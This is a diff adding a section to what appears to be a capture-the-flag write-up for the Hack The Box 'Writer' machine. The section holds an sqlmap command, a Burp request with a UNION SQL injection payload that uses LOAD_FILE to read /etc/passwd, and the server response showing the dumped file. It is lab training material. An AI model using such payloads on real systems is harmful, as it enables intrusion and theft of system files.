@@ -146,3 +146,110 @@ code injection vector. Meanwhile, let's also run sqlmap on the site to see if we
 ``` 
 sqlmap -r r.txt --dbs --batch --level 5 --risk 3 > sqlmap.dbs.writer.txt
 ```
+
+Now that we've revealed the `administrative` subdomain is vulnerable to sql injection let's open up burp and prepare a payload. 
+Substitute admin and password fields with an SQL injection:
+
+```
+POST /administrative HTTP/1.1
+Host: writer.htb
+Content-Length: 81
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://writer.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://writer.htb/administrative
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+uname=oops' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --&password=oops
+```
+
+No luck quite yet on the password getting dumped but we can see from the response that we can use this template to dump just about any file
+we could want!
+
+```
+HTTP/1.1 200 OK
+Date: Wed, 01 Dec 2021 22:44:56 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Cookie,Accept-Encoding
+Set-Cookie: session=eyJ1c2VyIjoib29wcycgVU5JT04gQUxMIFNFTEVDVCAwLExPQURfRklMRSgnL2V0Yy9wYXNzd2QnKSwyLDMsNCw1OyAtLSJ9.Yaf66A.xmNOdOSJytfu8X9p7d5Bi4XSAFY; HttpOnly; Path=/
+Connection: close
+Content-Type: text/html; charset=utf-8
+Content-Length: 3332
+
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta http-equiv="refresh" content="0.1; URL=/dashboard" />
+    <title>Redirecting | Writer.HTB</title>
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/redirect.css" rel="stylesheet">
+</head>
+
+<body>
+    <div class="wrapper">
+        <div class="page vertical-align text-center">
+            <div class="page-content vertical-align-middle">
+                <header>
+                    <h3 class="animation-slide-top">Welcome root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+kyle:x:1000:1000:Kyle Travis:/home/kyle:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+postfix:x:113:118::/var/spool/postfix:/usr/sbin/nologin
+filter:x:997:997:Postfix Filters:/var/spool/filter:/bin/sh
+john:x:1001:1001:,,,:/home/john:/bin/bash
+mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
+</h3>
+                </header>
+                <p class="success-advise">Redirecting you to the dashboard. If you are not redirected then click the button below to be redirected.</p>
+                <a class="btn btn-primary btn-round mb-5" href="/dashboard">CLICK HERE</a>
+                <footer class="page-copyright">
+                    <p>© Writer.HTB 2021. All RIGHT RESERVED.</p>
+                </footer>
+            </div>
+        </div>
+    </div>
+    <script src="vendor/jquery/jquery.min.js"></script>
+    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+</body>
+
+</html>
+```
